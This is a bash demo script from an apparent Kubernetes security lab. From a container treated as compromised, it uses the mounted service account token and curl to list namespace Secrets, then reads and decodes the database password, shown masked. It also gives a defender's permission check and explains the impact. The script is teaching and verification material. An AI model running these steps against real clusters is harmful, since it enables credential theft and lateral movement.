#!/usr/bin/env bash
# Scenario 2 demo: from the (compromised) web container, use the auto-mounted
# service account token to read a Secret through the Kubernetes API.
# Uses only curl, already present in the image. The password is masked.
set -euo pipefail
source "$(dirname "$0")/../lib.sh"

echo "Scenario 2: over-permissive RBAC + auto-mounted token  (overlay: $(overlay))"
require_web

# Runs inside the web container: an authenticated API request using the
# mounted token and CA bundle. $1 = HTTP method, $2 = API path.
api_call() {
  # Single quotes on purpose: $SA, $1... expand in the container's sh.
  # shellcheck disable=SC2016
  in_web sh -c '
    SA=/var/run/secrets/kubernetes.io/serviceaccount
    curl -sS --cacert "$SA/ca.crt" \
         -H "Authorization: Bearer $(cat "$SA/token")" \
         -H "Content-Type: application/json" \
         -X "$1" ${3:+--data "$3"} \
         "https://kubernetes.default.svc$2"
  ' sh "$@"
}

step "A token is mounted into the container"
in_web ls /var/run/secrets/kubernetes.io/serviceaccount/ | sed 's/^/    /'
info "nginx never uses it - the attacker does"

step "Who does the API server think we are? (SelfSubjectReview)"
who=$(api_call POST /apis/authentication.k8s.io/v1/selfsubjectreviews \
  '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}')
info "username: $(grep -o '"username": *"[^"]*"' <<<"$who" | cut -d'"' -f4)"

step "List Secrets in our namespace"
list=$(api_call GET "/api/v1/namespaces/$NS/secrets")
grep -o '"name": *"[^"]*"' <<<"$list" | cut -d'"' -f4 | sed 's/^/    secret: /'

step "Read the database password (masked)"
secret=$(api_call GET "/api/v1/namespaces/$NS/secrets/db-credentials")
pw=$(grep -o '"password": *"[^"]*"' <<<"$secret" | cut -d'"' -f4 | base64 -d)
info "db-credentials/password = ${pw:0:3}***  (${#pw} characters, decoded)"

step "Defender's view: what this service account may do in '$NS'"
kubectl auth can-i --list -n "$NS" --as="system:serviceaccount:$NS:web" \
  | grep -E '^(Resources|secrets|pods|pods/exec|deployments\.apps) ' | sed 's/^/    /'

cat <<'EOF'

Impact: any code running in web can read every Secret in the namespace,
including the database password (scenario 3 shows the database is reachable
from web, too). With "edit" it could also create pods, exec into api and db,
and change Deployments - i.e. persist and move laterally through the API.

Next: make verify-2   (exit 0 = still exploitable)
EOF
